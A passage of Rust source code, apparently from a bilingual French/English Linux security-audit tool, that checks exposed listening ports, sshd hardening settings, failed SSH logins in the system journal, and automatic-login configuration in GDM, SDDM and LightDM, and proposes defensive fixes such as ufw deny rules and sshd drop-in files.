    // TCP d'abord, comme ss était lu.
    for (proto, udp) in [("tcp", false), ("udp", true)] {
        for prise in prises.iter().filter(|p| p.udp == udp) {
            let port = prise.port;
            let expose = prise.adresse.is_unspecified() || adresses.contains(&prise.adresse_ss());
            let i = info_port(port);
            // UDP : client DHCP (68) et ports éphémères anonymes (sockets clientes), ce ne sont pas des services.
            let bruit = proto == "udp" && (port == 68 || (port >= 32768 && i.service == crate::risk::inconnu()));
            if !expose || bruit || !vus.insert((proto, port)) {
                continue;
            }
            // Le nom que s'est donné le programme, prêt à montrer ; sinon son service.
            let nomme = prise.nom();
            // Montré sans guillemet ni parenthèse à lui : la porte MCP se repère sur eux (9e passe, R9-VUES-1).
            let montre = nomme.as_deref().map(crate::machine::chasse::nom_montre);
            let programme = montre
                .as_deref()
                .unwrap_or(tr!("programme inconnu (root ?)", "unknown program (root?)"));
            let (niveau, constat) = super::port_expose(port, proto, &i, programme, pare_feu_actif);
            // Le nom donné par le système, jamais « programme inconnu » traduit : la clé ne dépend pas de la langue.
            let objet = crate::modele::Objet::port(port, proto, nomme.as_deref());
            let constat = constat.avec_objet(objet.clone());
            let cle = format!("{port}/{proto}");
            if ufw && bloques.contains(&cle) {
                constats.push(alerte(
                    "Ports en écoute",
                    Niveau::Info,
                    trf!(
                        "{cle} ({}) ouvert par « {programme} », bloqué en entrée par la règle ufw que Vanguard a ajoutée (vérifier : sudo ufw status).", "{cle} ({}) opened by “{programme}”, blocked inbound by the ufw rule Vanguard added (check: sudo ufw status).",
                        i.service
                    ),
                ).avec_objet(objet));
                continue;
            }
            constats.push(match programme {
                p if proto == "udp" && port == 631 && p.starts_with("cups-browsed") => cups_browsed_expose().avec_objet(objet),
                "ollama" => constat.corriger(
                    tr!("Faire écouter Ollama uniquement en local (127.0.0.1)", "Make Ollama listen locally only (127.0.0.1)"),
                    // Lot U3 : daemon-reload et restart restent des commandes, après le fichier écrit par tee dans la même
                    // correction ; ils passeront au geste « unite » avec lui (U4).
                    &[
                        "sudo mkdir -p /etc/systemd/system/ollama.service.d",
                        "printf '[Service]\\nEnvironment=OLLAMA_HOST=127.0.0.1\\n' | sudo tee /etc/systemd/system/ollama.service.d/vanguard.conf >/dev/null",
                        "sudo systemctl daemon-reload",
                        "sudo systemctl restart ollama",
                    ],
                )
                .annulable(vec![Geste::fichier(crate::optimiser::OLLAMA_VANGUARD)]),
                // Un seul conseil par programme, même s'il ouvre un port TCP et un port UDP.
                "steam" if !deja_conseille.insert("steam") => constat,
                "steam" => match remote_play_steam() {
                    // Réglage déjà coupé : le port vient d'un Steam pas redémarré, ou de sa découverte locale.
                    Some(false) => constat.manuel(
                        tr!("Remote Play est déjà désactivé dans Steam, mais Steam garde le port qu'il a ouvert au démarrage : \
                         quittez complètement Steam et relancez-le. S'il reste ouvert, c'est la découverte des autres PC Steam \
                         du réseau ; votre pare-feu le bloque de toute façon", "Remote Play is already off in Steam, but Steam keeps the port it opened at startup: \
                         quit Steam completely and start it again. If it stays open, it is the discovery of the other Steam PCs \
                         on the network; your firewall blocks it anyway"),
                        &[],
                    ),
                    _ => constat.manuel(
                        tr!("Si vous n'utilisez pas Remote Play : Steam > Paramètres > Remote Play > décocher « Activer Remote Play »", "If you do not use Remote Play: Steam > Settings > Remote Play > uncheck “Enable Remote Play”"),
                        &[],
                    ),
                },
                _ if niveau >= Niveau::Moyen && ufw => {
                    constat
                        .corriger(trf!("Bloquer le port {port}/{proto} dans le pare-feu", "Block port {port}/{proto} in the firewall"), &[&format!("sudo ufw deny {cle}")])
                        .bloquant(cle)
                }
                _ => constat,
            });
        }
    }
    if constats.is_empty() {
        constats.push(super::aucun_port_expose());
    }
    constats
}

/// Remote Play est-il activé dans Steam ? Lu dans le réglage « EnableStreaming » de chaque compte Steam.
/// `None` si le réglage est introuvable (Steam absent ou jamais configuré).
fn remote_play_steam() -> Option<bool> {
    let maison = Path::new(&home()).to_path_buf();
    let valeurs: Vec<bool> = [".steam/steam/userdata", ".local/share/Steam/userdata"]
        .iter()
        .filter_map(|d| std::fs::read_dir(maison.join(d)).ok())
        .flatten()
        .flatten()
        .filter_map(|compte| std::fs::read_to_string(compte.path().join("config/localconfig.vdf")).ok())
        .filter_map(|t| enable_streaming(&t))
        .collect();
    (!valeurs.is_empty()).then(|| valeurs.iter().any(|v| *v))
}

/// Valeur de « EnableStreaming » dans un fichier de réglages Steam (format VDF : "`clé"<tab>"valeur`").
fn enable_streaming(vdf: &str) -> Option<bool> {
    vdf.lines().find_map(|l| {
        let mut champs = l.split('"').filter(|c| !c.trim().is_empty());
        (champs.next()? == "EnableStreaming").then(|| champs.next() == Some("1"))
    })
}

/// Vérifie puis recharge sshd. « try-reload-or-restart » : sur Ubuntu, ssh.socket ne démarre sshd qu'à la première
/// connexion, et « reload » d'un service arrêté échouait alors que la configuration était écrite. Lot U3 : reste une
/// commande, parce qu'elle suit toujours l'écriture du fichier de sshd et `sshd -t` ; geste avec eux (U4, U7).
pub(crate) const RECHARGER_SSHD: &str = "sudo sshd -t && sudo systemctl try-reload-or-restart sshd";

/// Le serveur SSH tourne-t-il ? « sshd » sur Arch et Fedora, « ssh » sur Debian, Ubuntu et Mint. Ubuntu (22.10+) le
/// lance à la demande par ssh.socket : le service paraît arrêté alors que le port 22 accepte les connexions. `None` :
/// état non lu ; seule `ssh_serveur` le dit, les autres règles du serveur SSH se taisent (`!= Some(true)`).
fn sshd_actif() -> Option<bool> {
    un_service_actif(&["sshd", "ssh", "sshd.socket", "ssh.socket"])
}

fn ssh_serveur() -> Constat {
    if !systemd() {
        return impossible("SSH", tr!("systemd absent", "systemd missing"));
    }
    match sshd_actif() {
        Some(true) => {}
        Some(false) => return ok("SSH", tr!("Serveur SSH désactivé.", "SSH server off.")),
        None => {
            return impossible(
                "SSH",
                tr!(
                    "état du serveur SSH non lu (ni le bus système ni systemctl n'ont répondu)",
                    "SSH server state not read (neither the system bus nor systemctl answered)"
                ),
            );
        }
    }
    let Some(conf) = configuration_sshd() else {
        return impossible(
            "SSH",
            tr!(
                "configuration de sshd lisible seulement par root",
                "sshd configuration readable by root only"
            ),
        );
    };
    let a_des_cles = std::fs::metadata(format!("{}/.ssh/authorized_keys", home())).is_ok_and(|m| m.len() > 0);
    juger_ssh_serveur(&conf, a_des_cles)
}

/// Le jugement de la configuration de sshd en marche (`sshd -T`) : chaque réglage corrigé par un geste de défense
/// (un fichier de sshd_config.d validé par `sshd -t`, puis sshd rechargé : les sessions ouvertes restent), que
/// l'enfant root refuse depuis une session SSH. `a_des_cles` : le compte de ce bilan a des clés autorisées (l'enfant
/// le revérifie pour chaque personne devant l'écran) ; sans elles, couper les mots de passe reste à la main.
fn juger_ssh_serveur(conf: &str, a_des_cles: bool) -> Constat {
    use crate::machine::gestes_unix::{Defense, ReglageSsh};
    let durcir = |c: Constat, action: &str, r: ReglageSsh| {
        // Sans le hasard d'une note, la correction reste à la main (le fichier dit, sans rien lancer).
        let c = c.manuel(
            trf!(
                "{action}, à la main dans {SSHD_VANGUARD}, puis :",
                "{action}, by hand in {SSHD_VANGUARD}, then:"
            ),
            &[RECHARGER_SSHD],
        );
        crate::machine::defense::corriger(c, action, &[Defense::DurcirSsh(r)])
    };
    if mots_de_passe_vides_sshd(conf) {
        return durcir(
            alerte(
                "SSH",
                Niveau::Critique,
                tr!(
                    "SSH accepte les comptes sans mot de passe : un compte sans mot de passe s'ouvre depuis le réseau sans rien taper.",
                    "SSH accepts accounts without a password: an account without a password opens from the network without typing anything."
                ),
            ),
            tr!(
                "Refuser les mots de passe vides en SSH (le réglage de sshd)",
                "Refuse empty passwords over SSH (sshd's setting)"
            ),
            ReglageSsh::MotsDePasseVides,
        );
    }
    if valeur_sshd(conf, "PermitRootLogin").as_deref() == Some("yes") {
        return durcir(
            alerte(
                "SSH",
                Niveau::Eleve,
                tr!("Connexion root autorisée en SSH.", "Root login allowed over SSH."),
            ),
            tr!("Interdire la connexion SSH en root", "Forbid root login over SSH"),
            ReglageSsh::Root,
        );
    }
    if mots_de_passe_sshd(conf) {
        let c = alerte(
            "SSH",
            Niveau::Moyen,
            tr!(
                "Connexion SSH par mot de passe permise (vulnérable au brute force).",
                "SSH password login allowed (vulnerable to brute force)."
            ),
        );
        return if a_des_cles {
            durcir(
                c,
                tr!(
                    "N'accepter que les clés SSH (vous avez déjà des clés autorisées)",
                    "Accept SSH keys only (you already have authorized keys)"
                ),
                ReglageSsh::MotsDePasse,
            )
        } else {
            // Sans clé autorisée, couper les mots de passe vous enfermerait dehors.
            c.manuel(
                tr!("Ajoutez d'abord votre clé depuis l'autre ordinateur (ssh-copy-id), puis relancez la correction. Ou désactivez SSH si inutile :", "First add your key from the other computer (ssh-copy-id), then run the fix again. Or turn SSH off if unused:"),
                &["sudo systemctl disable --now sshd"],
            )
        };
    }
    ok(
        "SSH",
        tr!(
            "Serveur SSH actif, clés uniquement, root interdit.",
            "SSH server running, keys only, root forbidden."
        ),
    )
}

/// Ports renvoyés par SSH ouverts à tout le réseau : avec « GatewayPorts yes » (ou « clientspecified »), une personne
/// connectée en SSH ouvre sur cet ordinateur un port que tout le réseau joint, et que le pare-feu ne connaît pas.
/// Par défaut, sshd ne les ouvre qu'à cet ordinateur lui-même. Un rechargement de sshd ne coupe aucune connexion en
/// cours.
fn juger_ports_ssh(conf: &str) -> Option<Constat> {
    let valeur = valeur_sshd(conf, "GatewayPorts")?;
    matches!(valeur.as_str(), "yes" | "clientspecified").then(|| {
        alerte(
            "SSH",
            Niveau::Moyen,
            trf!(
                "« GatewayPorts {valeur} » : un port renvoyé par SSH peut s'ouvrir à tout le réseau, sans passer par le pare-feu.",
                "“GatewayPorts {valeur}”: a port forwarded over SSH can open to the whole network, bypassing the firewall."
            ),
        )
        .corriger(
            tr!(
                "Garder les ports renvoyés pour cet ordinateur seul",
                "Keep forwarded ports for this computer only"
            ),
            &[
                &format!("echo 'GatewayPorts no' | sudo tee -a {SSHD_VANGUARD} >/dev/null"),
                RECHARGER_SSHD,
            ],
        )
        .annulable(vec![Geste::fichier(SSHD_VANGUARD)])
    })
}

/// Réglages secondaires de sshd, une information : l'affichage X11 renvoyé (« X11Forwarding yes », que Debian et
/// Ubuntu posent) ouvre à chaque client un passage de plus vers cet ordinateur ; plus de 6 essais de mot de passe par
/// connexion (« MaxAuthTries », 6 par défaut) laissent deviner plus vite. Seulement des valeurs écrites : celles par
/// défaut d'OpenSSH sont sûres. Couper X11 gêne qui lance ici des fenêtres par « ssh -X » : la correction se montre
/// avant.
fn juger_ssh_secondaire(conf: &str) -> Option<Constat> {
    let x11 = valeur_sshd(conf, "X11Forwarding").as_deref() == Some("yes");
    let essais = valeur_sshd(conf, "MaxAuthTries")
        .and_then(|v| v.parse::<u32>().ok())
        .filter(|n| *n > 6);
    if !x11 && essais.is_none() {
        return None;
    }
    // Une commande écrite en toutes lettres par réglage : rien de variable n'entre dans sudo.
    let mut constats = Vec::new();
    let mut commandes = Vec::new();
    if x11 {
        constats.push(tr!("affichage X11 renvoyé", "X11 display forwarded").to_string());
        commandes.push(format!(
            "echo 'X11Forwarding no' | sudo tee -a {SSHD_VANGUARD} >/dev/null"
        ));
    }
    if let Some(n) = essais {
        constats.push(trf!(
            "{n} essais de mot de passe par connexion",
            "{n} password attempts per connection"
        ));
        // La valeur par défaut d'OpenSSH, pas moins : chaque clé refusée de l'agent SSH compte pour un essai.
        commandes.push(format!(
            "echo 'MaxAuthTries 6' | sudo tee -a {SSHD_VANGUARD} >/dev/null"
        ));
    }
    commandes.push(RECHARGER_SSHD.to_string());
    Some(
        alerte(
            "SSH",
            Niveau::Info,
            trf!(
                "Réglages de sshd à resserrer : {}.",
                "sshd settings to tighten: {}.",
                constats.join(", ")
            ),
        )
        .corriger(
            tr!("Les resserrer (le réglage de sshd)", "Tighten them (sshd's setting)"),
            &commandes,
        )
        .annulable(vec![Geste::fichier(SSHD_VANGUARD)]),
    )
}

fn ssh_secondaire() -> Option<Constat> {
    if !systemd() || sshd_actif() != Some(true) {
        return None;
    }
    juger_ssh_secondaire(&configuration_sshd()?)
}

fn ports_ssh() -> Option<Constat> {
    // Configuration illisible : la règle du serveur SSH le dit déjà.
    if !systemd() || sshd_actif() != Some(true) {
        return None;
    }
    juger_ports_ssh(&configuration_sshd()?)
}

/// Le journal de sshd des dernières 24 h, un message par ligne, ou le constat qui dit pourquoi il ne se lit pas. `None` :
/// pas de serveur SSH ici (ou pas de systemd pour le dire), rien à lire.
fn journal_sshd() -> Option<Result<String, Constat>> {
    if !systemd() || sshd_actif() != Some(true) {
        return None;
    }
    // « sshd-session » : depuis OpenSSH 9.8, c'est lui qui écrit les échecs de connexion. Les fichiers du journal
    // d'abord ; journalctl en secours, quand ils ne se lisent pas (droits, xz, format plus récent).
    if let Some(messages) = journal_systemd::messages_de(&["sshd", "sshd-session"], 24 * 3600) {
        return Some(Ok(comme_journalctl_cat(&messages)));
    }
    let r = crate::commande::lancer(
        // Les lignes écrites par root seulement (`journal_systemd::messages_de` dit pourquoi).
        crate::commande::par_le_systeme("journalctl").args([
            "_COMM=sshd",
            "_UID=0",
            "+",
            "_COMM=sshd-session",
            "_UID=0",
            "--since",
            "-24h",
            "-o",
            "cat",
            "--no-pager",
        ]),
        20,
    );
    // journalctl absent ou bloqué : le dire, plutôt que de laisser croire qu'il n'y a rien.
    let Some(r) = r else {
        return Some(Err(impossible(
            "SSH",
            tr!("journalctl n'a pas répondu", "journalctl did not answer"),
        )));
    };
    // Hors des groupes adm, wheel ou systemd-journal, journalctl ne montre que le journal de l'utilisateur : zéro
    // échec passerait pour rien à signaler.
    if r.erreurs.contains("other users and the system") || r.erreurs.contains("insufficient permissions") {
        return Some(Err(impossible(
            "SSH",
            tr!(
                "journal du système réservé aux groupes adm, wheel et systemd-journal",
                "system journal reserved for the adm, wheel and systemd-journal groups"
            ),
        )));
    }
    Some(Ok(r.sortie))
}

/// Les messages comme les écrit `journalctl -o cat` : chacun suivi d'un saut de ligne.
fn comme_journalctl_cat(messages: &[String]) -> String {
    messages.iter().flat_map(|m| [m.as_str(), "\n"]).collect()
}

/// Quelqu'un essaie-t-il de deviner un mot de passe SSH ? Tentatives ratées des dernières 24 h, dans le journal.
fn ssh_echecs() -> Option<Constat> {
    let journal = match journal_sshd()? {
        Ok(journal) => journal,
        Err(constat) => return Some(constat),
    };
    // Configuration illisible : on suppose les mots de passe permis (la valeur par défaut de sshd).
    let mots_de_passe = configuration_sshd().is_none_or(|c| mots_de_passe_sshd(&c));
    juger_echecs_ssh(&journal, mots_de_passe, || {
        BLOQUEURS.into_iter().find(|s| service_actif(s) == Some(true))
    })
}

/// Le jugement du journal de sshd des dernières 24 h : `mots_de_passe`, sshd les accepte ; `bloqueur`, le service
/// qui bloque déjà les adresses qui insistent (demandé seulement s'il y a quelque chose à dire, comme avant).
pub(super) fn juger_echecs_ssh(
    journal: &str,
    mots_de_passe: bool,
    bloqueur: impl FnOnce() -> Option<&'static str>,
) -> Option<Constat> {
    let (tentatives, adresses) = echecs_ssh(journal);
    let internet = adresses.iter().filter(|ip| d_internet(ip)).count();
    let niveau = niveau_echecs_ssh(tentatives, internet > 0, mots_de_passe)?;
    let n = adresses.len();
    let origine = if internet > 0 {
        trf!(
            ", dont {internet} sur Internet : le port SSH est ouvert vers l'extérieur",
            ", {internet} of them on the Internet: the SSH port is open to the outside"
        )
    } else {
        tr!(", toutes du réseau local", ", all from the local network").to_string()
    };
    let texte = if mots_de_passe {
        trf!(
            "{tentatives} tentative(s) de connexion SSH ratée(s) en 24 h, depuis {n} adresse(s){origine}. Quelqu'un essaie sans doute de deviner un mot de passe.",
            "{tentatives} failed SSH login attempt(s) in 24 h, from {n} address(es){origine}. Someone is probably trying to guess a password."
        )
    } else {
        trf!(
            "{tentatives} tentative(s) de connexion SSH ratée(s) en 24 h, depuis {n} adresse(s){origine}. Sans danger tant que seules les clés sont acceptées.",
            "{tentatives} failed SSH login attempt(s) in 24 h, from {n} address(es){origine}. Harmless as long as only keys are accepted."
        )
    };
    let bloqueur = bloqueur();
    let texte = match bloqueur {
        Some(b) => format!(
            "{texte} {}",
            trf!(
                "{b} bloque déjà les adresses qui insistent.",
                "{b} already blocks the addresses that keep trying."
            )
        ),
        None => texte,
    };
    let constat = alerte("SSH", niveau, texte);
    Some(match conseil_echecs_ssh(bloqueur.is_some(), internet > 0) {
        Some(conseil) => constat.manuel(&conseil, &[]),
        None => constat,
    })
}

/// Les programmes qui bloquent les adresses qui insistent, lus dans le journal : fail2ban, sshguard, CrowdSec.
const BLOQUEURS: [&str; 3] = ["fail2ban", "sshguard", "crowdsec"];

/// Le conseil après des tentatives ratées : installer un bloqueur s'il n'y en a pas, et fermer le port vers Internet
/// s'il y est ouvert. Avec un bloqueur et rien venu d'Internet, il n'y a rien de plus à faire.
fn conseil_echecs_ssh(bloqueur: bool, internet: bool) -> Option<String> {
    let installer = (!bloqueur).then(|| {
        trf!(
            "Bloquer les adresses qui insistent : sshguard (ou fail2ban), à régler avec votre pare-feu selon la documentation de votre distribution : {}",
            "Block the addresses that keep trying: sshguard (or fail2ban), to set up with your firewall following your distribution's documentation: {}",
            commande_installation("sshguard")
        )
    });
    let fermer = internet.then(|| {
        tr!(
            "Si vous n'avez pas besoin de SSH depuis l'extérieur, retirez la redirection du port sur votre routeur",
            "If you do not need SSH from outside, remove the port forwarding on your router"
        )
        .to_string()
    });
    match (installer, fermer) {
        (Some(i), Some(f)) => Some(format!("{i}. {f}")),
        (i, f) => i.or(f),
    }
}

/// Tentatives de connexion SSH ratées dans le journal de sshd : (nombre, adresses d'origine). Une tentative laisse
/// plusieurs lignes (« Invalid user », puis « Failed password ») qui partagent l'adresse et le port d'origine :
/// comptée une fois. L'adresse est celle du dernier « port » de la ligne : avant lui, le nom d'utilisateur tenté est
/// écrit tel que l'attaquant l'a choisi, et peut contenir un faux « from … port … ».
fn echecs_ssh(journal: &str) -> (usize, std::collections::BTreeSet<std::net::IpAddr>) {
    const ECHECS: [&str; 4] = [
        "Failed password",
        "Failed keyboard-interactive",
        "Invalid user",
        "maximum authentication attempts",
    ];
    let tentatives: std::collections::BTreeSet<(std::net::IpAddr, u16)> = journal
        .lines()
        .filter(|l| ECHECS.iter().any(|e| l.contains(e)))
        .filter_map(crate::machine::chasse::origine_ssh)
        .collect();
    let adresses = tentatives.iter().map(|(ip, _)| *ip).collect();
    (tentatives.len(), adresses)
}

/// Les tentatives de connexion à sshd, dans l'ordre du journal (voir `chasse::tentatives_ssh_datees`).
fn tentatives_ssh(journal: &str) -> Vec<crate::machine::chasse::Tentative> {
    let lignes: Vec<((), &str)> = journal.lines().map(|l| ((), l)).collect();
    crate::machine::chasse::tentatives_ssh_datees(&lignes)
        .into_iter()
        .map(|((), t)| t)
        .collect()
}

/// Les tentatives de connexion SSH des dernières 24 h, pour la recherche d'un mot de passe deviné (`machine::chasse`) ;
/// `Err` : le journal ne se lit pas. `None` : pas de serveur SSH.
pub(crate) fn tentatives_ssh_lues() -> Option<Result<Vec<crate::machine::chasse::Tentative>, Constat>> {
    Some(journal_sshd()?.map(|journal| tentatives_ssh(&journal)))
}

/// Adresse d'Internet, pas du réseau local (privé, lien local, partagé du fournisseur, la machine elle-même), par
/// la règle commune. La copie d'avant comptait « ::ffff:192.168.1.5 », une adresse de la maison telle que la note
/// un sshd qui écoute aussi en IPv6, comme venue d'Internet.
fn d_internet(ip: &std::net::IpAddr) -> bool {
    crate::socle::adresses::sur_internet(*ip)
}

/// Gravité des tentatives ratées. Moins de 5 en 24 h, c'est du bruit (une faute de frappe, un vieux script) ; avec
/// les mots de passe permis, des tentatives venues d'Internet sont une attaque en cours.
fn niveau_echecs_ssh(tentatives: usize, internet: bool, mots_de_passe: bool) -> Option<Niveau> {
    if tentatives < 5 {
        return None;
    }
    Some(match (mots_de_passe, internet) {
        (true, true) => Niveau::Eleve,
        (true, false) => Niveau::Moyen,
        (false, _) => Niveau::Info,
    })
}

/// Lance une commande avec un délai maximal (sources réseau lentes). `None` si elle dépasse le délai ou si
/// son code de retour n'est pas dans `codes_ok` : une commande en échec ne doit jamais passer pour « rien à signaler »
/// (vu en test : Docker inaccessible donnait « aucun port exposé »). Certains outils répondent « rien à faire »
/// par un code non nul (yay -Qua : 1) : on les liste explicitement.
fn sortie_delai(cmd: &str, args: &[&str], secondes: u64, codes_ok: &[i32]) -> Option<String> {
    let r = crate::commande::lancer(crate::commande::par_le_systeme(cmd).args(args), secondes)?;
    r.code.is_some_and(|c| codes_ok.contains(&c)).then_some(r.sortie)
}

/// Dernière valeur de `cle` dans les sections d'un fichier INI que `section` accepte (noms sans crochets). Les
/// commentaires (« # », « ; ») sont ignorés ; la clé ne tient pas compte de la casse.
fn valeur_ini(texte: &str, section: impl Fn(&str) -> bool, cle: &str) -> Option<String> {
    let mut dedans = false;
    let mut trouvee = None;
    for ligne in texte.lines().map(str::trim) {
        if ligne.starts_with('#') || ligne.starts_with(';') {
            continue;
        }
        if let Some(nom) = ligne.strip_prefix('[').and_then(|l| l.strip_suffix(']')) {
            dedans = section(nom);
        } else if dedans
            && let Some((k, v)) = ligne.split_once('=')
            && k.trim().eq_ignore_ascii_case(cle)
        {
            trouvee = Some(v.trim().to_string());
        }
    }
    trouvee
}

/// Le gestionnaire de connexion qui lit un fichier (`fichiers_de_connexion`) : dit par le dossier où le fichier a été
/// trouvé, jamais deviné d'un bout de son chemin (ronde 10 du lot 096 : un ajout de LightDM nommé « 50-sddm.conf »
/// était lu comme un fichier de SDDM, et son ouverture automatique n'était pas vue).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Gestionnaire {
    Gdm,
    Sddm,
    LightDm,
}

/// Un fichier d'un gestionnaire de connexion. `texte` à `None` : il existe mais ne s'est pas lu (droits, pas du texte
/// UTF-8, plus de `CONNEXION_OCTETS_MAX` octets, ou c'est un dossier qui ne se liste pas) ; jamais compté comme sain.
#[derive(Debug, Clone, PartialEq, Eq)]
struct FichierDeConnexion {
    gestionnaire: Gestionnaire,
    chemin: String,
    texte: Option<String>,
}

/// Au plus autant d'octets lus d'un fichier de gestionnaire de connexion ; au-delà, non vérifié.
const CONNEXION_OCTETS_MAX: u64 = 1 << 20;

/// Au plus autant de fichiers lus dans un dossier de gestionnaire de connexion ; au-delà, le dossier est non vérifié.
const CONNEXION_FICHIERS_MAX: usize = 1000;

/// Les affectations d'un fichier de connexion, (section, clé, valeur) telles qu'écrites, dans l'ordre du fichier, lues
/// comme son gestionnaire les lit (ronde 11 du lot 096, N11-1) :
/// - SDDM 0.21.0 (`ConfigReader.cpp`, `loadInternal`) : tout ce qui suit le premier « # » de la ligne est retiré, PUIS
///   une ligne qui garde un « = » est une affectation, même « `[x=y]` » ; sinon « `[nom]` » ouvre une section. Ainsi
///   « `[Autologin]` # note » ouvre bien la section Autologin ;
/// - GDM et LightDM (GKeyFile de GLib) : « # » seulement en tête de ligne ; « `[nom]` » avant « = ».
///
/// Une marque UTF-8 (BOM) en tête est retirée : ce que Qt et GLib en font n'a pas été vérifié, et la lire comme une
/// section ne peut que faire voir une ouverture de plus, jamais en cacher une.
fn affectations(g: Gestionnaire, texte: &str) -> Vec<(String, String, String)> {
    let texte = texte.strip_prefix('\u{feff}').unwrap_or(texte);
    let mut section = String::new();
    let mut sortie = Vec::new();
    for ligne in texte.lines() {
        let mut l = ligne.trim();
        if g == Gestionnaire::Sddm {
            l = l.split_once('#').map_or(l, |(avant, _)| avant).trim();
        } else if l.starts_with('#') {
            continue;
        }
        let section_ici = l.strip_prefix('[').and_then(|l| l.strip_suffix(']'));
        match (g == Gestionnaire::Sddm, l.split_once('='), section_ici) {
            (true, Some((k, v)), _) | (false, Some((k, v)), None) => {
                sortie.push((section.clone(), k.trim().to_string(), v.trim().to_string()));
            }
            (_, _, Some(nom)) => section = nom.to_string(),
            _ => {}
        }
    }
    sortie
}

/// Une valeur d'ouverture automatique posée dans un fichier : l'indice du fichier, puis la section, la clé et la
/// valeur telles qu'écrites.
struct Pose {
    fichier: usize,
    section: String,
    cle: String,
    valeur: String,
}

/// Ce que Vanguard conclut d'une façon d'ouvrir la session (un compte de GDM, de SDDM ou de LightDM, l'invité de
/// LightDM) : `vue`, le compte et le fichier qui le pose ; `douteuse`, le fichier d'une ouverture qu'une autre ligne
/// annule sans que Vanguard soit sûr que le gestionnaire lise cette ligne, ni dans cet ordre (N11-2).
struct Ouverture {
    vue: Option<(String, String)>,
    douteuse: Option<String>,
}

/// Les façons d'ouvrir la session, dans l'ordre où elles sont dites : GDM (automatique, puis minutée), SDDM, l'invité
/// de LightDM, puis le compte de LightDM (« autologin-guest » passe avant « autologin-user », seat.c de LightDM 1.32).
///
/// `vue` : chaque gestionnaire est jugé sur l'ensemble de ses fichiers, clé par clé, la dernière valeur l'emportant
/// (une clé posée dans un fichier, son interrupteur dans un autre, comptent ensemble). Les sections et les clés y sont
/// prises sans tenir compte de la casse : une ouverture de trop peut être dite, jamais une de moins.
///
/// `douteuse` (ronde 11 du lot 096, N11-2) : une ouverture n'est tenue pour annulée que par une ligne plus loin DANS LE
/// MÊME FICHIER, même section et même clé, casse comprise, avec une valeur qui coupe à coup sûr. Tout le reste n'est
/// pas cru : un autre fichier (SDDM trie selon la langue et ne lit pas les fichiers cachés ; LightDM saute un fichier
/// qu'il ne sait pas lire ; GDM ne lit qu'un fichier, celui de sa distribution), une autre section (LightDM applique
/// `[Seat:*]` puis la section du siège ; `[SeatDefaults]` et `[Seat:*]` sont deux noms), une autre casse (GKeyFile,
/// SDDM). Les fichiers illisibles n'entrent pas ici (`constat_d_ouverture` les dit).
fn ouvertures(fichiers: &[FichierDeConnexion]) -> [Ouverture; 5] {
    let poses = |g: Gestionnaire, section: &dyn Fn(&str) -> bool, cle: &str| -> Vec<Pose> {
        let mut sortie = Vec::new();
        for (i, f) in fichiers.iter().enumerate().filter(|(_, f)| f.gestionnaire == g) {
            let Some(texte) = &f.texte else { continue };
            for (s, k, v) in affectations(g, texte) {
                if section(&s) && k.eq_ignore_ascii_case(cle) {
                    sortie.push(Pose {
                        fichier: i,
                        section: s,
                        cle: k,
                        valeur: v,
                    });
                }
            }
        }
        sortie
    };
    let chemin = |p: &Pose| fichiers.get(p.fichier).map_or_else(String::new, |f| f.chemin.clone());
    let derniere = |poses: &[Pose]| poses.last().map(|p| (p.valeur.clone(), chemin(p)));
    // Le fichier d'une pose qui ouvre et qu'aucune ligne sûre n'annule après elle.
    let vivante = |poses: &[Pose], ouvre: &dyn Fn(&str) -> bool, coupe: &dyn Fn(&str) -> bool| {
        poses.iter().enumerate().find_map(|(i, p)| {
            let annulee = poses
                .iter()
                .skip(i)
                .skip(1)
                .any(|q| q.fichier == p.fichier && q.section == p.section && q.cle == p.cle && coupe(&q.valeur));
            (ouvre(&p.valeur) && !annulee).then(|| chemin(p))
        })
    };
    let rempli = |v: &str| !v.is_empty();
    let vide = str::is_empty;
    let vrai = |v: &str| v.eq_ignore_ascii_case("true") || v == "1";
    // GDM (gdm-settings-utils.c) : « false » sans casse ou « 0 » ; une autre valeur est une erreur, jamais crue.
    let faux_gdm = |v: &str| v.eq_ignore_ascii_case("false") || v == "0";
    let daemon = |s: &str| s.eq_ignore_ascii_case("daemon");
    let gdm = |interrupteur: &str, compte: &str| {
        let oui = poses(Gestionnaire::Gdm, &daemon, interrupteur);
        let comptes = poses(Gestionnaire::Gdm, &daemon, compte);
        let vue = match (derniere(&oui), derniere(&comptes)) {
            (Some((o, fichier)), Some((c, _))) if vrai(&o) && !c.is_empty() => Some((c, fichier)),
            _ => None,
        };
        let douteuse = vivante(&oui, &|v| !faux_gdm(v), &faux_gdm).and_then(|_| vivante(&comptes, &rempli, &vide));
        Ouverture { vue, douteuse }
    };
    let compte = |g: Gestionnaire, section: &dyn Fn(&str) -> bool, cle: &str| {
        let p = poses(g, section, cle);
        Ouverture {
            vue: derniere(&p).filter(|(c, _)| !c.is_empty()),
            douteuse: vivante(&p, &rempli, &vide),
        }
    };
    let siege = |s: &str| s.starts_with("Seat") || s == "SeatDefaults";
    let invite = {
        let p = poses(Gestionnaire::LightDm, &siege, "autologin-guest");
        Ouverture {
            vue: derniere(&p)
                .filter(|(v, _)| vrai(v))
                .map(|(_, fichier)| (tr!("invité", "guest").to_string(), fichier)),
            // LightDM (configuration.c, config_get_boolean) : seul « true » ouvre ; toute autre valeur coupe.
            douteuse: vivante(&p, &vrai, &|v| v != "true"),
        }
    };
    [
        gdm("AutomaticLoginEnable", "AutomaticLogin"),
        gdm("TimedLoginEnable", "TimedLogin"),
        compte(Gestionnaire::Sddm, &|s| s == "Autologin", "User"),
        invite,
        compte(Gestionnaire::LightDm, &siege, "autologin-user"),
    ]
}

/// Le compte dont la session s'ouvre toute seule, et le fichier qui le dit (`ouvertures`). `None` : personne vu.
fn ouverture_automatique_de(fichiers: &[FichierDeConnexion]) -> Option<(String, String)> {
    ouvertures(fichiers).into_iter().find_map(|o| o.vue)
}

/// Les fichiers d'une ouverture annulée d'une façon que Vanguard ne sait pas confirmer (`ouvertures`, N11-2), sans
/// doublon : jamais comptés comme une machine sans ouverture automatique.
fn annulations_non_sures(fichiers: &[FichierDeConnexion]) -> Vec<String> {
    let mut sortie: Vec<String> = Vec::new();
    for o in ouvertures(fichiers) {
        if o.vue.is_none()
            && let Some(f) = o.douteuse
            && !sortie.contains(&f)
        {
            sortie.push(f);
        }
    }
    sortie
}

/// Un fichier de gestionnaire de connexion lu (`lire_fichier_de_connexion`).
enum Lu {
    /// Il n'existe pas : rien à juger.
    Absent,
    /// Il existe et se lit (`FichierDeConnexion::texte`) ; `None` : il ne se lit pas.
    Present(Option<String>),
}

/// Le texte d'un fichier de gestionnaire de connexion, ou s'il est absent.
